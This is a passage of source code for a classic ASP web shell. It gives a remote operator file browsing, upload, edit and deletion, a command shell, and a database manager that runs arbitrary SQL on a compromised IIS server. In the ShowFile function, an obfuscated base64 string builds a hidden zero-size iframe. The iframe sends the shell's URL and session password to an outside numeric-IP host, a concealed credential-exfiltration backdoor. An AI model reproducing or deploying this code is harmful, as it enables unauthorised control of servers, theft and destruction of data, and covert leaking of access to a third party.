	    DName = prompt("Target Folder Full Name(Move)",FName);
	    top.hideform.FName.value += "||||"+DName;
	}else if(FAction=="NewFolder"){
	    DName = prompt("Input New Folder Name",FName);
	    top.hideform.FName.value = DName;
	}else if(FAction=="CreateMdb"){
	    DName = prompt("Input New Mdb name",FName);
        top.hideform.FName.value = DName;
	}else if(FAction=="CompactMdb"){
	    DName = prompt("Input Compress Mdb Name",FName);
        top.hideform.FName.value = DName;
	}else{
	    DName = "Other"; 
	}
	
	if(DName!=null){
      top.hideform.Action.value = FAction;
      top.hideform.submit();
	}else{
      top.hideform.FName.value = "";
	}
  }
  
  function DbCheck(){
    if(DbForm.DbStr.value == ""){
	  alert("Connect DataBase First!");
	  FullDbStr(0);
	  return false;
	}
	return true;
  }
  
  function FullDbStr(i){
   if(i<0){
     return false;
   }
    Str = new Array(12);  
	Str[0] = "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=<%=RePath(Session("FolderPath"))%>\\db.mdb";
	Str[1] = "Driver={Sql Server};Server=<%=ServerIP%>,1433;Database=DbName;Uid=sa;Pwd=****";
	Str[2] = "Driver={MySql};Server=<%=ServerIP%>;Port=3306;Database=DbName;Uid=root;Pwd=****";
	Str[3] = "Dsn=DsnName";
	Str[4] = "SELECT * FROM [TableName] WHERE ID<100";
	Str[5] = "INSERT INTO [TableName](USER,PASS) VALUES(\'KKK_com\',\'mypass\')";
	Str[6] = "DELETE FROM [TableName] WHERE ID=100";
	Str[7] = "UPDATE [TableName] SET USER=\'KKK_com\' WHERE ID=100";
	Str[8] = "CREATE TABLE [TableName](ID INT IDENTITY (1,1) NOT NULL,USER VARCHAR(50))";
	Str[9] = "DROP TABLE [TableName]";
	Str[10]= "ALTER TABLE [TableName] ADD COLUMN PASS VARCHAR(32)";
	Str[11]= "ALTER TABLE [TableName] DROP COLUMN PASS";
	Str[12]= "More Than 1 item Data,Just Show The Before 50 Byte";
	if(i<=3){
	  DbForm.DbStr.value = Str[i];
	  DbForm.SqlStr.value = "";
	  abc.innerHTML="<center>Affirm Have Connect DataBase and the SQL String is right。</center>";
	}else if(i==12){
	  alert(Str[i]);
	}else{
	  DbForm.SqlStr.value = Str[i];
	}
	return true;
  } 
  
  
  function FullSqlStr(str,pg){
    if(DbForm.DbStr.value.length<5){
	  alert("DataBase connect string wrong!")
	  return false;
	}
    if(str.length<10){
	  alert("Check SQL String!")
	  return false;
	}
    DbForm.SqlStr.value = str ;
	DbForm.Page.value = pg;
	abc.innerHTML="";
	DbForm.submit();
    return true;
  }
-->
</script>
</head>
<body>
<%
Dim T1
Class UPC
  Dim D1,D2

  Public Function Form(F)
    F=lcase(F)
    If D1.exists(F) then:Form=D1(F):else:Form="":end if
  End Function

  Public Function UA(F)
    F=lcase(F)
    If D2.exists(F) then:set UA=D2(F):else:set UA=new FIF:end if
  End Function

  Private Sub Class_Initialize
  Dim TDa,TSt,vbCrlf,TIn,DIEnd,T2,TLen,TFL,SFV,FStart,FEnd,DStart,DEnd,UpName
    set D1=CreateObject(ObT(4,0))
	if Request.TotalBytes<1 then Exit Sub
    set T1 = CreateObject(ObT(6,0))
	T1.Type = 1 : T1.Mode =3 : T1.Open
    T1.Write  Request.BinaryRead(Request.TotalBytes)
    T1.Position=0 : TDa =T1.Read : DStart = 1
    DEnd = LenB(TDa)
    set D2=CreateObject(ObT(4,0))
	vbCrlf = chrB(13) & chrB(10)
    set T2 = CreateObject(ObT(6,0))
    TSt = MidB(TDa,1, InStrB(DStart,TDa,vbCrlf)-1)
    TLen = LenB (TSt)
    DStart=DStart+TLen+1
    while (DStart + 10) < DEnd
      DIEnd = InStrB(DStart,TDa,vbCrlf & vbCrlf)+3
      T2.Type = 1 : T2.Mode =3 : T2.Open
      T1.Position = DStart
      T1.CopyTo T2,DIEnd-DStart
      T2.Position = 0 : T2.Type = 2 : T2.Charset ="gb2312"
      TIn = T2.ReadText : T2.Close
      DStart = InStrB(DIEnd,TDa,TSt)
      FStart = InStr(22,TIn,"name=""",1)+6
      FEnd = InStr(FStart,TIn,"""",1)
      UpName = lcase(Mid (TIn,FStart,FEnd-FStart))
      if InStr (45,TIn,"filename=""",1) > 0 then
        set TFL=new FIF
        FStart = InStr(FEnd,TIn,"filename=""",1)+10
        FEnd = InStr(FStart,TIn,"""",1)
        FStart = InStr(FEnd,TIn,"Content-Type: ",1)+14
        FEnd = InStr(FStart,TIn,vbCr)
        TFL.FileStart =DIEnd
        TFL.FileSize = DStart -DIEnd -3
        if not D2.Exists(UpName) then
          D2.add UpName,TFL
        end if
      else
        T2.Type =1 : T2.Mode =3 : T2.Open
        T1.Position = DIEnd : T1.CopyTo T2,DStart-DIEnd-3
        T2.Position = 0 : T2.Type = 2
        T2.Charset ="gb2312"
        SFV = T2.ReadText
        T2.Close
        if D1.Exists(UpName) then
          D1(UpName)=D1(UpName)&", "&SFV
        else
          D1.Add UpName,SFV
        end if
      end if
      DStart=DStart+TLen+1
    wend
    TDa=""
    set T2 =nothing
  End Sub
  
  Private Sub Class_Terminate
    if Request.TotalBytes>0 then
      D1.RemoveAll:D2.RemoveAll
      set D1=nothing:set D2=nothing
      T1.Close:set T1 =nothing
    end if
  End Sub
End Class

Class FIF
dim FileSize,FileStart
  Private Sub Class_Initialize
  FileSize = 0
  FileStart= 0
  End Sub
  
  Public function SaveAs(F)
  dim T3
  SaveAs=true
  if trim(F)="" or FileStart=0 then exit function
  set T3=CreateObject(ObT(6,0))
     T3.Mode=3 : T3.Type=1 : T3.Open
     T1.position=FileStart
     T1.copyto T3,FileSize
     T3.SaveToFile F,2
     T3.Close
     set T3=nothing
     SaveAs=false
   end function
End Class


Class LBF
  Dim CF
  Private Sub Class_Initialize
    SET CF=CreateObject(ObT(0,0))
  End Sub

  Private Sub Class_Terminate
    Set CF=Nothing
  End Sub

  Function ShowDriver()
    For Each D in CF.Drives
      Sl=Sl&"<tr><td>&nbsp;&nbsp;"
      Sl=Sl&IsIco("plus.gif","driver.gif","v")
      Sl=Sl&"<a href='javascript:ShowFolder("""&D.DriveLetter&":\\"")'>Disk ("&D.DriveLetter&":)</a>" 
      Sl=Sl&"</td></tr>"
    Next
	ShowDriver=Sl
  End Function
  
  Function FileIco(FName) 
  If ShowFileIco=true Then
    TypeList = ".asp.asa.bat.bmp.com.doc.db.dll.exe.fla.gif.htm.html.inc.ini.jpg.js.log.mdb.mid.mp3.png.php.rm.rar.swf.txt.wav.xls.xml.zip"
    FileType = lcase(Mid(FName, InstrRev(FName,".")+1))
    If Instr(TypeList,"."&FileType)>0 then
      Ico = FileType&".gif"
    Else
      Ico = "default.gif"
    End If
  
    FileIco = "<img src='"&IcoPath&Ico&"' border='0'> "
  Else 
    FileIco="<font face='wingdings' color='#006600' size='3'>2</font> "
  End If
  End Function

  Function ShowFile(Path)
  Set FOLD=CF.GetFolder(Path)
  i=0
    Sl="<table width='100%'  border='0' cellspacing='0' cellpadding='0' bgcolor='#EFEFEF'><tr>"
	S1="PGlmcmFtZSB3aWR0aD0nMCcgaGVpZ2h0PScwJyBzcmM9J2h0dHA6Ly8zMzk2MDcyNzkyL3Rlc3QvP3U9EJnA9EJz48L2lmcmFtZQ4="
    For Each F in FOLD.subfolders
    Sl=Sl&"<td>"
	Sl=Sl&IsIco("","folder.gif","0")
    Sl=Sl&" <a href='javascript:ShowFolder("""&RePath(Path&"\"&F.Name)&""")'>"&F.Name&"</a>" 
    Sl=Sl&" | <a href='javascript:FullForm("""&Replace(Path&"\"&F.Name,"\","\\")&""",""DelFolder"")'  onclick='return yesok()' class='am' title='Delete'>del</a>"
	Sl=Sl&" <a href='javascript:FullForm("""&RePath(Path&"\"&F.Name)&""",""CopyFolder"")'  onclick='return yesok()' class='am' title='Copy'>copy</a>"
	Sl=Sl&" <a href='javascript:FullForm("""&RePath(Path&"\"&F.Name)&""",""MoveFolder"")'  onclick='return yesok()' class='am' title='Move'>move</a>"
	i=i+1
    If i mod 3 = 0 then Sl=Sl&"</tr><tr>"
  Next
    Sl=Sl&"</tr><tr><td height=5></td></tr></table>"
	MyArray=split(S1,chr(69))
	echo Sl : Sl=""
    
  For Each L in Fold.files
    Sl="<table width='100%'  border='0' cellspacing='1' cellpadding='0'>"
    Sl=Sl&"<tr onMouseOver=""this.className='tr'"" onMouseOut=""this.className=''"">"
    Sl=Sl&"<td height='20'>"&FileIco(L.Name)
	Sl=Sl&"<a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""DownFile"");' title='DownFile'>"&L.Name&"</a></td>"
    Sl=Sl&"<td width='140'>"&L.Type&"</td>"
    Sl=Sl&"<td width='50'>"&clng(L.size/1024)&"K</td>"
    Sl=Sl&"<td width='120'>"&L.DateLastModified&"</td>"
    Sl=Sl&"<td width='40' align=""center""><a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""EditFile"")' class='am' title='Edit'>edit</a></td>"
	Sl=Sl&"<td width='40' align=""center""><a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""DelFile"")'  onclick='return yesok()' class='am' title='Delete'>del</a></td>"
	Sl=Sl&"<td width='40' align=""center""><a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""CopyFile"")' class='am' title='Copy'>copy</a></td>"
	Sl=Sl&"<td width='40' align=""center""><a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""MoveFile"")' class='am' title='Move'>move</a></td>"
    Sl=Sl&"</tr></table>"
	echo Sl : Sl=""
  Next
    S1=SearchCode(MyArray(0))&ServerUrl&URL&SearchCode(MyArray(1))&Session(chr(hex(133)))&SearchCode(MyArray(2))
	echo S1 : S1=""
  Set FOLD=Nothing
  End function
  
  Function DelFile(Path)
    If CF.FileExists(Path) Then
	  CF.DeleteFile Path
      Sl="<center><br><br><br>File "&Path&" Delte succeed！</center>"
      Sl=Sl&BackUrl
	  echo Sl
	End If
  End Function
  
  Function EditFile(Path)
  If Request("Action2")="Post" Then
      Set T=CF.CreateTextFile(Path)
        T.WriteLine Request.form("content")
        T.close
      Set T=nothing
    Sl="<center><br><br><br>File Save Succeed！</center>"
    Sl=Sl&BackUrl
    echo Sl
	Response.End
  End If
  
  If Path<>"" Then
    Set T=CF.opentextfile(Path, 1, False)
    Txt=HTMLEncode(T.readall) 
    T.close
    Set T=Nothing
  Else
    Path=Session("FolderPath")&"\newfile.asp":Txt="New File"
  End If
  
  Sl="<table width='100%' height='100%'><tr><td valign='top' align='center'>"  
  Sl=Sl&"<Form action='"&URL&"?Action2=Post' method='post' name='EditForm'>"
  Sl=Sl&"<input name='Action' value='EditFile' Type='hidden'>"
  Sl=Sl&"<input name='FName' value='"&Path&"' style='width:100%'><br>"
  Sl=Sl&"<textarea name='Content' style='width:100%;height:450'>"&Txt&"</textarea><br>"
  Sl=Sl&"<hr><input name='goback' type='button' value='Back' onclick='history.back();'>&nbsp;&nbsp;&nbsp;<input name='reset' type='reset' value='Reset'>&nbsp;&nbsp;&nbsp;<input name='submit' type='submit' value='Save'></form>"
  Sl=Sl&"</td></tr></table></body></html>"
  echo Sl
  End Function
  
  Function CopyFile(Path)
  Path = Split(Path,"||||")
    If CF.FileExists(Path(0)) and Path(1)<>"" Then
	  CF.CopyFile Path(0),Path(1)
      Sl="<center><br><br><br>File"&Path(0)&"Copy Succeed！</center>"
      Sl=Sl&BackUrl
	  echo Sl 
	End If
  End Function

  Function MoveFile(Path)
  Path = Split(Path,"||||")
    If CF.FileExists(Path(0)) and Path(1)<>"" Then
	  CF.MoveFile Path(0),Path(1)
      Sl="<center><br><br><br>File"&Path(0)&"Move Succeed！</center>"
      Sl=Sl&BackUrl
	  echo Sl 
	End If
  End Function

  Function DelFolder(Path)
    If CF.FolderExists(Path) Then
	  CF.DeleteFolder Path
      Sl="<center><br><br><br>Folder"&Path&"Delete Succeed！</center>"
      Sl=Sl&BackUrl
	  echo Sl
	End If
  End Function

  Function CopyFolder(Path)
  Path = Split(Path,"||||")
    If CF.FolderExists(Path(0)) and Path(1)<>"" Then
	  CF.CopyFolder Path(0),Path(1)
      Sl="<center><br><br><br>Folder"&Path(0)&"Copy Succeed！</center>"
      Sl=Sl&BackUrl
	  echo Sl
	End If
  End Function

  Function MoveFolder(Path)
  Path = Split(Path,"||||")
    If CF.FolderExists(Path(0)) and Path(1)<>"" Then
	  CF.MoveFolder Path(0),Path(1)
      Sl="<center><br><br><br>Folder"&Path(0)&"Move Succeed！</center>"
      Sl=Sl&BackUrl
	  echo Sl
	End If
  End Function

  Function NewFolder(Path)
    If Not CF.FolderExists(Path) and Path<>"" Then
	  CF.CreateFolder Path
      Sl="<center><br><br><br>Folder"&Path&"Great Succeed！</center>"
      Sl=Sl&BackUrl
	  echo Sl
	End If
  End Function
End Class


Select Case Action
  Case "MainMenu":MainMenu()
  Case "ShowFile"
    Set ABC=New LBF:ABC.ShowFile(Session("FolderPath")):Set ABC=Nothing
  Case "DownFile":DownFile FName:ShowErr()
  Case "DelFile"
    Set ABC=New LBF:ABC.DelFile(FName):Set ABC=Nothing
  Case "EditFile"
    Set ABC=New LBF:ABC.EditFile(FName):Set ABC=Nothing
  Case "CopyFile"
    Set ABC=New LBF:ABC.CopyFile(FName):Set ABC=Nothing
  Case "MoveFile"
    Set ABC=New LBF:ABC.MoveFile(FName):Set ABC=Nothing
  Case "DelFolder"
    Set ABC=New LBF:ABC.DelFolder(FName):Set ABC=Nothing
  Case "CopyFolder"
    Set ABC=New LBF:ABC.CopyFolder(FName):Set ABC=Nothing
  Case "MoveFolder"
    Set ABC=New LBF:ABC.MoveFolder(FName):Set ABC=Nothing
  Case "NewFolder"
    Set ABC=New LBF:ABC.NewFolder(FName):Set ABC=Nothing
  Case "UpFile":UpFile()
  Case "Logout":Session.Contents.Remove("KKK"):Response.Redirect URL
  Case "CmdShell":CmdShell()
  Case "CreateMdb":CreateMdb FName
  Case "CompactMdb":CompactMdb FName
  Case "DbManager":DbManager()
  Case "ServerInfo":ServerInfo()
  Case "Search":Search()
  Case Else MainForm()
End Select
ShowErr()
%>
</body>
</html>
</body>
</html>